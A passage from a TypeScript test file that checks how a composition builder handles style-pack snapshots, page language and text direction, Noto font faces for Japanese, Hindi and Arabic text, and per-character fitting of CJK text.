  it("snapshots one styled scene per core style", async () => {
    for (const id of ["minimal", "editorial", "technical", "energetic"]) {
      const c = buildComposition(req("typography", DETERMINISTIC_PROPS_EXAMPLES.typography, { tokens: await styled(id) }));
      expect(c.html.slice(c.html.indexOf("/* style pack */"))).toMatchSnapshot(id);
    }
  });
});

describe("scripts: lang, dir and fonts", () => {
  const faces = (html: string) => [...html.matchAll(/@font-face \{ font-family: "([^"]+)"; src: url\("assets\/fonts\/([^"]+)"\) format\("(\w+)"\)/g)].map((m) => `${m[1]}|${m[2]}|${m[3]}`);

  it("keeps Latin scenes exactly as before (lang en, no dir, no script faces)", () => {
    const c = buildComposition(req("typography", { lines: ["Vector databases"] }, { tokens: resolveTokens() }));
    expect(c.html).toContain('<html lang="en">');
    expect(c.html).not.toContain("dir=");
    expect(c.html).not.toContain("/* scripts:");
    expect(faces(c.html).every((f) => !f.includes("Noto Sans JP"))).toBe(true);
  });

  it("Japanese: lang ja, Noto Sans JP @font-face (OpenType), strict line breaking", () => {
    const c = buildComposition(req("typography", { lines: ["ベクトルデータベースは、意味で検索します。"] }, { tokens: resolveTokens(undefined, {}, undefined, { language: "ja-JP" }) }));
    expect(c.html).toContain('<html lang="ja-JP">');
    expect(c.html).not.toContain('dir="rtl"');
    expect(faces(c.html)).toContain("Noto Sans JP|NotoSansJP-Bold.otf|opentype");
    expect(c.html).toMatch(/--vs-font-heading: "Inter", .*"Noto Sans JP"/);
    expect(c.html).toContain("line-break: strict");
    expect(c.html).not.toContain('src: local("Noto Sans JP")');
    expect(c.assets.map((a) => a.dest)).toContain("assets/fonts/NotoSansJP-Regular.otf");
  });

  it("detects the script from the text when the tokens carry no language (Hindi)", () => {
    const c = buildComposition(req("typography", { lines: ["वेक्टर डेटाबेस अर्थ से खोजते हैं"] }, { tokens: resolveTokens() }));
    expect(c.html).toContain('<html lang="hi">');
    expect(faces(c.html)).toContain("Noto Sans Devanagari|NotoSansDevanagari-Regular.ttf|truetype");
  });

  it("Arabic: dir rtl on the page, LTR geometry, plaintext paragraphs, start alignment for a left style", () => {
    const t = { ...resolveTokens(undefined, {}, undefined, { language: "ar" }), text_align: "left" as const };
    const c = buildComposition(req("typography", { lines: ["قواعد البيانات المتجهة", "نموذج Whisper لعام 2022"] }, { tokens: t }));
    expect(c.html).toContain('<html lang="ar" dir="rtl">');
    expect(faces(c.html)).toContain("Noto Sans Arabic|NotoSansArabic-Bold.ttf|truetype");
    expect(c.html).toContain("#vs-root { direction: ltr; }");
    expect(c.html).toContain("unicode-bidi: plaintext");
    expect(c.html).toContain("text-align: start");
    expect(c.html).toContain(".vs-code, .vs-command, .vs-code * { direction: ltr; unicode-bidi: isolate; }");
  });

  it("fits CJK text per character instead of treating a sentence as one word", () => {
    const text = "ベクトルデータベースは意味で検索します";
    const c = buildComposition(req("typography", { lines: [text] }, { tokens: resolveTokens(undefined, {}, undefined, { language: "ja" }) }));
    const box = c.text_boxes.find((b) => b.text.includes("ベクトル"))!;
    // As one 19-em "word" it would have to fit a single line (≤ w/19 px); broken per character it wraps larger.
    expect(box.font_px).toBeGreaterThan((box.rect.w / 19) * 1.5);
    expect(box.truncated).toBe(false);
  });
});
